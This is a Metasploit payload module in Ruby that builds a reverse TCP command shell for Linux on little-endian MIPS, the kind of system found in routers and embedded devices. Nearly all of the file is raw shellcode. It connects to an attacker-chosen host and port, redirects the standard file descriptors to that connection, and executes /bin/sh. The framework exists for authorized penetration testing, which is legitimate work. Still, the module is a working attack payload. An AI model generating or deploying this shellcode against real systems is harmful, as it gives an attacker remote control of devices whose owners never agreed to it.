##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)
# + Few removals of unneccessary zero bytes by kost

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'Julien Tinnes',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        })
    )
  end

  def generate
    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
      return super
    end

    host = Rex::Socket.addr_atoi(datastore['LHOST'])
    port = Integer(datastore['LPORT'])

    host = [host].pack("N").unpack("cccc")
    port = [port].pack("n").unpack("cc")

    shellcode =
      "\xef\xff\x09\x24" +                  # li	t1,-17
      "\xff\xff\x10\x05" +                  # bltzal	t0,0x4
      "\x82\x82\x08\x28" +                  # slti	t0,zero,-32126
      "\x27\x48\x20\x01" +                  # nor	t1,t1,zero
      "\x21\xc8\x3f\x01" +                  # addu	t9,t1,ra
      "\x48\x85\xb9\xaf" +                  # sw	t9,-31416(sp)
      "\x48\x85\xb9\x23" +                  # addi	t9,sp,-31416
      "\x00\x00\x1c\x3c" +                  # lui	gp,0x0
      "\x00\x00\x9c\x27" +                  # addiu	gp,gp,0
      "\x21\xe0\x99\x03" +                  # addu	gp,gp,t9
      "\x00\x00\x89\x8f" +                  # lw	t1,0(gp)
      "\xd8\xff\xbd\x27" +                  # addiu	sp,sp,-40
      "\xe8\x00\x2a\x25" +                  # addiu	t2,t1,232
      "\x04\x00\x47\x8d" +                  # lw	a3,4(t2)
      "\xe8\x00\x28\x8d" +                  # lw	t0,232(t1)
      host[2..3].pack("C2") + "\x04\x3c" +  # lui	a0,0x901
      host[0..1].pack("C2") + "\x83\x34" +  # ori	v1,a0,0xa8c0
      "\x18\x00\xb9\x27" +                  # addiu	t9,sp,24
      "\x02\x00\x06\x24" +                  # li	a2,2
      port.pack("C2") + "\x05\x24" +        # li	a1,9746
      "\x08\x00\xa6\xa7" +                  # sh	a2,8(sp)
      "\x0a\x00\xa5\xa7" +                  # sh	a1,10(sp)
      "\x18\x00\xa8\xaf" +                  # sw	t0,24(sp)
      "\x1c\x00\xa7\xaf" +                  # sw	a3,28(sp)
      "\x0c\x00\xa3\xaf" +                  # sw	v1,12(sp)
      "\x20\x00\xb9\xaf" +                  # sw	t9,32(sp)
      "\x24\x00\xa0\xaf" +                  # sw	zero,36(sp)
      "\x02\x00\x04\x24" +                  # li	a0,2
      "\x02\x00\x05\x24" +                  # li	a1,2
      "\x21\x30\x00\x00" +                  # move	a2,zero
      "\x57\x10\x02\x24" +                  # li	v0,4183
      "\x0c\x01\x01\x01" +                  # syscall
      "\x21\x18\x40\x00" +                  # move	v1,v0
      "\xff\xff\x02\x24" +                  # li	v0,-1
      "\x1a\x00\x62\x10" +                  # beq	v1,v0,0xf4
      "\x01\x00\x04\x24" +                  # li	a0,1
      "\x21\x20\x60\x00" +                  # move	a0,v1
      "\x08\x00\xa5\x27" +                  # addiu	a1,sp,8
      "\x10\x00\x06\x24" +                  # li	a2,16
      "\x4a\x10\x02\x24" +                  # li	v0,4170
      "\x0c\x01\x01\x01" +                  # syscall
      "\x0e\x00\x40\x14" +                  # bnez	v0,0xe0
      "\x21\x28\x00\x00" +                  # move	a1,zero
      "\xdf\x0f\x02\x24" +                  # li	v0,4063
      "\x0c\x01\x01\x01" +                  # syscall
      "\x01\x00\x05\x24" +                  # li	a1,1
      "\xdf\x0f\x02\x24" +                  # li	v0,4063
      "\x0c\x01\x01\x01" +                  # syscall
      "\x02\x00\x05\x24" +                  # li	a1,2
      "\xdf\x0f\x02\x24" +                  # li	v0,4063
      "\x0c\x01\x01\x01" +                  # syscall
      "\x21\x30\x00\x00" +                  # move	a2,zero
      "\x21\x20\x20\x03" +                  # move	a0,t9
      "\x20\x00\xa5\x27" +                  # addiu	a1,sp,32
      "\xab\x0f\x02\x24" +                  # li	v0,4011
      "\x0c\x01\x01\x01" +                  # syscall
      "\x21\x20\x00\x00" +                  # move	a0,zero
      "\xa1\x0f\x02\x24" +                  # li	v0,4001
      "\x0c\x01\x01\x01" +                  # syscall
      "\x08\x00\xe0\x03" +                  # jr	ra
      "\x28\x00\xbd\x27" +                  # addiu	sp,sp,40
      "\xa1\x0f\x02\x24" +                  # li	v0,4001
      "\x0c\x01\x01\x01" +                  # syscall
      "\xe5\xff\x00\x10" +                  # b	0x94
      "\x21\x20\x60\x00" +                  # move	a0,v1
      "\x2f\x62\x69\x6e" +                  # "/bin"
      "\x2f\x73\x68\x00" +                  # "/sh\x00"
      "0"*80
  end

end
